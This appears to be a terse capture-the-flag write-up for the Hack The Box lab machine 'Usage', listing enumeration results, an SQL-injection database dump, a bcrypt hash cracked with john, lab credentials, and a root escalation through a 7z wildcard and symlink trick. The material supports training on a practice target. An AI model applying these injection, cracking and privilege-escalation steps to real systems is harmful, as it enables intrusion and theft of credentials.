---
{"dg-publish":true,"permalink":"/write-ups/hack-the-box/usage/"}
---

# Enum
## Ports
PORT   STATE SERVICE REASON 
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
##  Users
admin:whatever1
### system
dash
xander:`3nc0d3d_pa$$w0rd`
##  Passwords
whatever1
`3nc0d3d_pa$$w0rd`
## OS
`Linux usage 5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024 x86_64`
Ubuntu 22.04.4 LTS \n \l
## 22
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a0f8fdd304b807a063dd37dfd7eeca78 (ECDSA)
|_  256 bd22f5287727fb65baf6fd2f10c7828f (ED25519)
## 80
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|http-title: Daily Blogs
|http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
PHP/8.1.2-1ubuntu2.14
|Laravel version|10.18.0|

/MVwt4IDP.php4: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
### Cookie
Cookie XSRF-TOKEN created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
### http://usage.htb/forget-password
Create an account and try to recover the passwd
sqli is posible
# Exploit
## Sqli
Database: usage_blog
[15 tables]
+------------------------+
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_role_users       |
| admin_roles            |
| admin_user_permissions |
| admin_users            |
| blog                   |
| failed_jobs            |
| migrations             |
| password_reset_tokens  |
| personal_access_tokens |
| users                  |
+------------------------+

Database: usage_blog
### Table: admin_users
[8 columns]
+----------------+--------------+
| Column         | Type         |
+----------------+--------------+
| avatar         | varchar(255) |
| created_at     | timestamp    |
| id             | int unsigned |
| name           | varchar(255) |
| password       | varchar(60)  |
| remember_token | varchar(100) |
| updated_at     | timestamp    |
| username       | varchar(190) 
Database: usage_blog
Table: admin_users
[1 entry]
+----------+
| username |
+----------+
| admin    |
+----------+
| password                                                     |
+--------------------------------------------------------------+
`$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2`

### Table: users
[8 columns]
+-------------------+-----------------+
| Column            | Type            |
+-------------------+-----------------+
| created_at        | timestamp       |
| email             | varchar(255)    |
| email_verified_at | timestamp       |
| id                | bigint unsigned |
| name              | varchar(255)    |
| password          | varchar(255)    |
| remember_token    | varchar(100)    |
| updated_at        | timestamp       |
+-------------------+-----------------+
Table: users
[9 entries]
+----------------------+
#### email
+----------------------+
| asd@asd.asd          |
| karkor23@hotmail.com |
| n3vada@usage.htb     |
| raj@raj.com          |
| raj@usage.htb        |
| test@arkane.org      |
| test@test.com        |
| test@tet.com         |
| testtester@test.com  |
+----------------------+
## Crack the hash
`$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2`
`john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash`
`whatever1`
login in the admin page
## Get access
[LFI]
https://flyd.uk/post/cve-2023-24249/
# Escalation
-rwxrwxr-x 1 dash dash 1176 Aug 23  2023 /var/www/html/project_admin/.env
DB_CONNECTION=mysql
1351   │ DB_HOST=127.0.0.1
1352   │ DB_PORT=3306
1353   │ DB_DATABASE=usage_blog
1354   │ DB_USERNAME=staff
1355   │ DB_PASSWORD=s3cr3t_c0d3d_1uth
##  Get access like xander
Using password found in ``**.monitrc**``
## Get root
sudo -l
/usr/bin/usage_management
`ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fdb8c912d98c85eb5970211443440a15d910ce7f, for GNU/Linux 3.2.0, not stripped`

### strings /usr/bin/usage_management
/var/www/html
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
Error changing working directory to /var/www/html
/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql

#### 7z wildcard spare
[[Wildcard spare#7z\|Wildcard spare#7z]]
```sh
cd /var/www/html/
touch '@root.txt'
ln -s -r /root/root.txt root.txt
sudo /usr/bin/usage_management #Opcion 1 (Project Backup)
```